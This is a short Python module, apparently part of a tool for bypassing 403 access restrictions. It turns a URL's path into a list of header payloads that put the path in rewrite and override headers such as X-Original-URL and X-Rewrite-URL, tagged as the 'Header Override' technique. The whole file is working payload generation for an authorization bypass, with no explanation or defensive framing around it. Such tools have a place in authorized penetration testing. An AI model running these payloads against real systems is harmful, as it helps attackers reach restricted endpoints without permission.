from urllib.parse import urlsplit


def build_override(url):
    path = urlsplit(url).path

    headers = ["X-Original-URL", "X-Rewrite-URL", "X-Override-URL",
    "X-Forwarded-Uri", "X-Original-URI", "X-Forwarded-Path", "X-Original-Path",
    "X-Rewrite-URI", "X-Forwarded-URL",]

    payloads = []

    for header in headers:
        payloads.append({header: path})

    return {"techniques": "Header Override", "payload": payloads, "location": "header",}